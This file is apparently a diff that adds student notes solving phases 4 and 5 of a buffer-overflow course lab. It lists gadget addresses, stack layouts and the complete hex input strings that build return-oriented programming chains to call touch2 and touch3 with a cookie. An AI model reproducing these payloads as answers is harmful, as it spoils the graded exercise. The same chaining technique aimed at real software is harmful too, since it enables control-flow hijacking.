@@ -1,0 +1,66 @@
+phase 4: 
+
+Stack:
+gadget1
+59b997fa
+gadget2
+touch2: 0x4017ec
+
+gadget1: 0x4019cc
+popq %rax
+ret -> gadget2
+
+gadget2: 0x4019a2
+movq %rax, %rdi
+ret
+
+shellcode: 
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+cc 19 40 00 00 00 00 00
+fa 97 b9 59 00 00 00 00
+a2 19 40 00 00 00 00 00
+ec 17 40 00 00 00 00 00
+
+
+phase 5: 
+
+hexmatch(char *val);
+
+Stack: 
+mov %rsp, %rax: 0x401a06
+mov %rax, %rdi: 0x4019a2
+pop %rax: 0x4019cc
+bias: 8 * 9 = 72 (0x48)
+mov %eax, %edx: 0x4019dd
+mov %edx, %ecx: 0x401a70
+mov %ecx, %esi: 0x401a27
+lea (%rdi, %rsi, 1), %rax: 0x4019d6
+mov %rax, %rdi: 0x4019a2
+Address of touch3: 0x4018fa
+ASCII of cookie: 35 39 62 39 39 37 66 61 00
+
+ASCII of cookie: 35 39 62 39 39 37 66 61
+Address of cookie: %rsp + bias
+
+shellcode: 
+
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+06 1a 40 00 00 00 00 00
+a2 19 40 00 00 00 00 00
+cc 19 40 00 00 00 00 00
+48 00 00 00 00 00 00 00
+dd 19 40 00 00 00 00 00
+70 1a 40 00 00 00 00 00
+27 1a 40 00 00 00 00 00
+d6 19 40 00 00 00 00 00
+a2 19 40 00 00 00 00 00
+fa 18 40 00 00 00 00 00
+35 39 62 39 39 37 66 61
